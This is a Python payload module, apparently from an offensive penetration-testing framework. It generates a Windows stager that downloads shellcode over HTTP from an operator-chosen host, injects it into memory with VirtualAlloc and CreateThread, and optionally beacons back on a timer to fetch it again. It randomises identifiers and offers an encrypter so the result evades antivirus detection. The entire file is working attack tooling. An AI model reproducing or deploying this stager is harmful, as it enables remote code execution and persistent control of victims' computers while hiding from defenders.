"""
Downloads shellcode over HTTP and executes it in memory

Optionally beacons back every X seconds

Based on the PoC from @midnite_runr https://github.com/secretsquirrel/shellcode_retriever

Module by @byt3bl33d3r
"""
from modules.common import helpers


class Payload:
	
	def __init__(self):

		self.description = "Downloads shellcode over HTTP and executes it in memory"
		self.language = "python"
		self.rating = "Excellent"
		self.extension = "py"

		self.required_options = { "compile_to_exe"  : ["Y", "Compile to an executable"],
								  "use_pyherion"    : ["N", "Use the pyherion encrypter"],
								  "DownloadHost"    : ["", "The host to download the shellcode from"],
								  "DownloadPort"    : ["80", "The port on the host to download from"],
								  "DownloadName"    : ["runme.bin", "Name of the file to download"],
								  "Beacon"          : ["N", "Optional: If the payload should beacon back"],
								  "BeaconSeconds"   : ["3600", "Optional: Beacon interval"]}
	
	def generate(self):

		imports = "import sys; import urllib2; import ctypes; import time; import signal\n"

		inject_func = helpers.randomString()
		getexec_func = helpers.randomString()
		main_func = helpers.randomString()

		retry_var = helpers.randomString()
		if self.required_options["Beacon"][0].lower() == 'n':
			global_vars = "%s = False" % retry_var
		elif self.required_options["Beacon"][0].lower() == 'y':
			global_vars = "%s = True" % retry_var

		interval_var = helpers.randomString()
		opener_var = helpers.randomString()

		global_vars += "\n%s = %s" % (interval_var, self.required_options["BeaconSeconds"][0]) 
		global_vars += "\n%s = urllib2.build_opener()\n" % (opener_var)

		shellcode_var = helpers.randomString()
		ptr_var = helpers.randomString()
		ht_var = helpers.randomString()
		buff_var = helpers.randomString()

		inject = "def %s(%s):" % (inject_func, shellcode_var)
		inject += "\n\t%s = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(%s)),ctypes.c_int(0x3000),ctypes.c_int(0x40))" % (ptr_var, shellcode_var)
		inject += "\n\tctypes.windll.kernel32.VirtualLock(ctypes.c_int(%s), ctypes.c_int(len(%s)))" % (ptr_var, shellcode_var)
		inject += "\n\t%s = (ctypes.c_char * len(%s)).from_buffer(%s)" % (buff_var, shellcode_var, shellcode_var)
		inject += "\n\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(%s), %s, ctypes.c_int(len(%s)))" % (ptr_var, buff_var, shellcode_var)
		inject += "\n\t%s = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(%s),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))" % (ht_var, ptr_var)
		inject += "\n\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(%s),ctypes.c_int(-1))\n" % ht_var

		url_var = helpers.randomString()
		shellcode_var = helpers.randomString()
		info_var = helpers.randomString()

		getexec = "def %s(%s):" % (getexec_func, url_var)
		getexec += "\n\t%s = %s.open(%s)" % (info_var, opener_var, url_var)
		getexec += "\n\t%s = %s.read()" % (shellcode_var, info_var)
		getexec += "\n\t%s = bytearray(%s)" % (shellcode_var, shellcode_var)
		getexec += "\n\t%s(%s)\n" % (inject_func, shellcode_var)

		url_var = helpers.randomString()

		main = "def %s():" % main_func
		main += "\n\t%s = 'http://%s:%s/%s'" % (url_var, self.required_options['DownloadHost'][0], self.required_options['DownloadPort'][0], self.required_options['DownloadName'][0])
		main += "\n\ttry:"
		main += "\n\t\t%s(%s)" % (getexec_func, url_var)
		main += "\n\t\twhile %s is True:" % retry_var
		main += "\n\t\t\ttime.sleep(%s)" % interval_var
		main += "\n\t\t\t%s(%s)" % (getexec_func, url_var)
		main += "\n\texcept Exception:"
		main += "\n\t\tpass"
		main += "\nif __name__ == '__main__':"
		main += "\n\t%s()" % main_func

		PayloadCode = imports + global_vars + inject + getexec + main

		if self.required_options["use_pyherion"][0].lower() == "y":
			PayloadCode = encryption.pyherion(PayloadCode)

		return PayloadCode